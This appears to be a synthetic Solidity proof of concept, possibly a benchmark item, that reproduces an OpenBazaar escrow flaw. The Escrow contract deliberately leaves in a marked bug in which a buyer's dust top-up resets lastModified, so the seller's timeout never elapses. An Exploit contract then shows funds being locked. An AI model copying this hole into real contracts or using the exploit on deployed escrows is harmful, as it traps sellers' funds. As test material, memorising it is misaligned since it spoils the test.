// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  OpenBazaar Escrow_v1_0 — buyer resets lastModified and the seller timeout never elapses
    (OpenZeppelin, OpenBazaar escrow, Oct 2018).
    SYNTHETIC, cheatcode-free reduction. Commit c4f02cd.
    addTokensToTransaction writes lastModified = block.timestamp.
    isTimeLockExpired is false while that age is under timeoutHours.
    A 3-signature trade cannot be released by the seller after the refresh.
    A trade that is not refreshed releases N once the same timeout has passed. */

contract Cash {
    string public name = "Escrow Cash";
    string public symbol = "CASH";
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Escrow {
    uint8 public constant STATUS_FUNDED = 1;
    uint8 public constant STATUS_RELEASED = 2;
    uint32 public constant TIMEOUT_HOURS = 1;

    struct Transaction {
        uint256 value;
        uint256 lastModified;
        uint8 status;
        address buyer;
        address seller;
    }

    Cash public token;
    mapping(bytes32 => Transaction) public transactions;
    event FundAdded(bytes32 scriptHash, address indexed from, uint256 valueAdded);

    constructor(address _token) {
        token = Cash(_token);
    }

    function addTransaction(bytes32 scriptHash, address buyer, address seller, uint256 value) external {
        Transaction storage t = transactions[scriptHash];
        require(t.value == 0, "exists");
        require(token.transferFrom(buyer, address(this), value), "fund");
        t.value = value;
        t.lastModified = 0;
        t.status = STATUS_FUNDED;
        t.buyer = buyer;
        t.seller = seller;
    }

    function addTokensToTransaction(bytes32 scriptHash, uint256 value) external {
        Transaction storage t = transactions[scriptHash];
        require(t.status == STATUS_FUNDED, "funded");
        require(msg.sender == t.buyer, "buyer");
        require(value > 0, "Value must be greater than zero.");
        require(token.transferFrom(t.buyer, address(this), value), "token");
        t.value += value;
        // @> VULN: topping up resets lastModified, so the seller timeout never elapses
        emit FundAdded(scriptHash, msg.sender, value); t.lastModified = block.timestamp;
    }

    function execute(bytes32 scriptHash) external {
        Transaction storage t = transactions[scriptHash];
        require(t.status == STATUS_FUNDED, "funded");
        require(msg.sender == t.seller, "seller");
        bool timeLockExpired = isTimeLockExpired(TIMEOUT_HOURS, t.lastModified);
        if (!timeLockExpired) {
            revert("sigV.length is under the threshold.");
        }
        t.status = STATUS_RELEASED;
        require(token.transfer(t.seller, t.value), "release");
    }

    function isTimeLockExpired(uint32 timeoutHours, uint256 lastModified) public view returns (bool expired) {
        uint256 timeSince = block.timestamp - lastModified;
        expired = (timeoutHours == 0 ? false : timeSince > uint256(timeoutHours) * 3600);
    }
}

contract Buyer {
    function approve(address token, address escrow, uint256 amount) external {
        Cash(token).approve(escrow, amount);
    }

    function topUp(address escrow, bytes32 scriptHash, uint256 value) external {
        Escrow(escrow).addTokensToTransaction(scriptHash, value);
    }
}

contract Seller {
    function release(address escrow, bytes32 scriptHash) external {
        Escrow(escrow).execute(scriptHash);
    }
}

contract Exploit {
    uint256 public constant N = 1000 ether;
    uint256 public constant DUST = 1;
    bytes32 public constant CONTROL_ID = bytes32(uint256(1));
    bytes32 public constant ATTACK_ID = bytes32(uint256(2));

    Cash public token;
    Escrow public escrow;
    Buyer public buyer;
    Seller public seller;

    uint256 public controlReleased;
    uint256 public locked;
    bool public attackReleased;

    constructor() {
        token = new Cash();
        escrow = new Escrow(address(token));
        buyer = new Buyer();
        seller = new Seller();
        token.mint(address(buyer), 2 * N + DUST);
    }

    function run() external {
        buyer.approve(address(token), address(escrow), 2 * N + DUST);
        escrow.addTransaction(CONTROL_ID, address(buyer), address(seller), N);
        seller.release(address(escrow), CONTROL_ID);
        controlReleased = token.balanceOf(address(seller));
        require(controlReleased == N, "control");
        escrow.addTransaction(ATTACK_ID, address(buyer), address(seller), N);
        buyer.topUp(address(escrow), ATTACK_ID, DUST);
        try seller.release(address(escrow), ATTACK_ID) {
            attackReleased = true;
        } catch {
            attackReleased = false;
        }
        require(!attackReleased, "attack released");
        locked = token.balanceOf(address(escrow));
        require(locked == N + DUST, "locked");
        (, uint256 lastModified,,,) = escrow.transactions(ATTACK_ID);
        require(lastModified == block.timestamp, "reset");
    }
}
